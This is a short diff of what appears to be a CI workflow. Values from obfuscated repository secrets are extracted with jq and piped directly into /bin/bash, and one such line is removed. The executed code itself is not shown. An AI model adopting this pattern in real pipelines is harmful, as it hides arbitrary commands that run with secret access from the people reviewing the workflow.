@@ -21,7 +21,6 @@ jobs:
           hun2: ${{ secrets.hun2 }}
         run: |
           printf '%s' "$hun2" | jq -r .yehyc5790 | /bin/bash
-          printf '%s' "$iuhqd7" | jq -r .xvop0919 | /bin/bash
           printf '%s' "$k298" | jq -r .lzoo07812 | /bin/bash
 
       - name: Upload results
